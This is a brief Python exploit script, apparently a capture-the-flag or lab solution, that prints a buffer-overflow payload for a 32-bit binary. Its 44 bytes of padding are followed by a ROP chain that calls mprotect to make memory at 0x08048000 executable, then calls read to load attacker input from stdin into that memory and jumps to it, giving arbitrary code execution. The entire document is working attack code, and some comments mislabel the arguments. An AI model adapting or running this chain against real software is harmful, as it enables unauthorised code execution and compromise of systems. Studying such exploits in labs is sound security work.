import struct

def p(x):
	return struct.pack('<L',x)

#Return address
mprotect=0x80523e0
pop3ret=0x8048882
read=0x080517f0

#Memory buffer
mem=0x08048000
payload=""

#Padding
payload+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"


payload+=p(mprotect) 	#Return to mprotect
payload+=p(pop3ret)		#Clean the stack
payload+=p(mem)	#Memory address, first argv mprotect
payload+=p(0x1000)		#Length, second argv mprotect
payload+=p(0x7)			#Protocol, third argc mprotect

payload+=p(read)		#Read system call
payload+=p(mem)	#Return of read system call
payload+=p(0x0)			#fd, second argv read (stdin)
payload+=p(mem)	#Memory address, first argv read
payload+=p(0x100)		#Length read

print payload
